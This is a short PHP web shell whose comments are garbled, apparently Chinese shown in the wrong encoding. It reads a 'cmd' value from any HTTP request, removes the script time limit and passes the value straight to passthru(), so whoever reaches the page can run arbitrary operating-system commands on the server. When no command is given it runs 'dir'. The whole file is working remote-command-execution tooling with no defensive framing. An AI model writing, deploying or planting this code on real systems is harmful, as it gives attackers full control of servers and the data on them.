<?php
//��get������ȡ����ȥ���ַ����еķ�б���ַ�
if (get_magic_quotes_gpc()){
	$_REQUEST["cmd"]=stripslashes($_REQUEST["cmd"]);
}
//�趨�������ļ���ִ��ʱ�䣬0Ϊ������
ini_set("max_execution_time",0);
//��ӡ�����ʼ��־
echo "begin<br>";
//����cmdָ��������
if(isset($_REQUEST["cmd"])){
	passthru($_REQUEST["cmd"]);
}else {
	passthru("dir");
}
//��ӡ���������־
echo "end";
?>